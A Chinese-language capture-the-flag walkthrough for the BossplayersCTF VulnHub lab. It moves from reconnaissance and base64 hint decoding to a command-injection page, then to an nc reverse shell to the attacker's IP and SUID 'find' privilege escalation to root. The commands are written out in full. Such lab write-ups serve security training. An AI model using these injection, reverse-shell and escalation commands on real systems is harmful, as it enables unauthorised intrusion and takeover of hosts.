# BossplayersCTF

## 一、测试环境

BossplayersCTF靶机、Mac攻击机、kali2020辅助攻击机

```text
VM名称：BossplayersCTF:1
下载（镜像）：https://www.vulnhub.com/entry/bossplayersctf-1,375
目标：获得root.txt并获得root权限
运行：VirtualBox
描述：Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF's. It should take around 30 minutes to root.
```

_**靶机BossplayersCTF**_

![image-20210305203819492](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305203819492.png)

## 二、信息收集

1.nmap扫描ip地址

```text
172.20.10.6
```

![image-20210305204421203](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305204421203.png)

我们访问ip地址看看~

![image-20210305204542521](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305204542521.png)

2.扫描详细信息~

![8505F88447E4F208478C3FBA0657FA4C](https://gitee.com/Harveysn0w/mac-note_img/raw/master/8505F88447E4F208478C3FBA0657FA4C.jpg)

3.扫描网站目录，看看有啥发现

```text
dirsearch -u http://172.20.10.6 -e *
```

![image-20210305205320691](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305205320691.png)

发现了robots.txt~查看一番

4.查看robots.txt

![image-20210305205406695](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305205406695.png)

嗯。base64加密，解密去~

![image-20210305205452916](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305205452916.png)

```text
lol try harder bro
```

5.没啥发现。F12看一看吧~

![image-20210305205600391](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305205600391.png)

找到了一串密文~貌似base64加密~

三次base64解密得到结果~

```text
workinginprogress.php
```

## 三、渗透测试

1.我们访问该页面-发现命令执行漏洞

![image-20210305221019903](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305221019903.png)

```text
下面这个代码可能存在命令执行漏洞
Test ping command - [ ]
```

经测试，确实存在命令注入漏洞

![image-20210305221610418](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305221610418.png)

2.反弹shell

访问下面这个链接

```text
http://172.20.10.6/workinginprogress.php?cmd=nc -e /bin/bash 172.20.10.7 1234
```

得到反弹shell

![image-20210305224324564](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305224324564.png)

```text
使用python命令获得shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20210305224615424](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305224615424.png)

## 四、提权

查找居于SUID权限可执行文件，发现`/usr/bin/find`

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image-20210305224837522](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305224837522.png)

find命令提权

```bash
find . -exec /bin/sh -p \; -quit
```

![image-20210305224934822](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305224934822.png)

## 五、寻找flag

![image-20210305225314319](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305225314319.png)

```text
congratulations
```

## Done！

